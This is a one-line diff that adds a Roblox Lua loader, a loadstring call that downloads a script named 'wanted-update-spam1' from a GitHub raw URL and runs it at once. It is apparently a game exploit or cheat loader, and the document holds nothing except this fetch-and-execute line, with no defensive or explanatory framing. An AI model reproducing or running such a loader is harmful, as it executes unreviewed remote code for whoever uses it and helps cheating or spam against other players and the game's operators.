@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/Docktuangular/loaders/main/loaders/wanted-update-spam1-wxqw81i6iabqij.lua"))()
